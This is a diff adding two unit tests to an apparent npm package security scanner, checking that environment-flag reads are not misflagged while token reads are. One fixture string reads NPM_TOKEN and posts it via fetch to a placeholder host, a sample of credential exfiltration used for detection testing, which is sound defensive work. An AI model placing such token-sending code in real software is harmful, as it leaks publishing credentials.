@@ -352,6 +352,50 @@ describe("review", () => {
     );
   });
 
+  test("does not treat common JS env flags as credential access", () => {
+    const staged = [
+      {
+        path: "index.js",
+        size: 180,
+        sha256: "env-flags",
+        flags: [],
+        textSample:
+          "const mode = process.env.NODE_ENV;\nif (import.meta.env.DEV || process.env['CI']) fetch('https://example.invalid/ping');\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings.some((finding) => finding.ruleId === "code.credential-access")).toBe(false);
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "code.network-access",
+          severity: "medium",
+          file: "index.js",
+        }),
+      ]),
+    );
+  });
+
+  test("still flags token reads next to common env flags", () => {
+    const staged = [
+      {
+        path: "index.js",
+        size: 180,
+        sha256: "env-token",
+        flags: [],
+        textSample:
+          "const mode = process.env.NODE_ENV;\nconst token = process.env['NPM_TOKEN'];\nfetch('https://example.invalid', { body: token || mode });\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
+      severity: "high",
+      file: "index.js",
+    });
+  });
+
   test("does not flag secret-looking source map content", () => {
     // The tar parser strips text samples from .map files (shouldSkipTextSample),
     // so deterministic rules never see source-map contents.
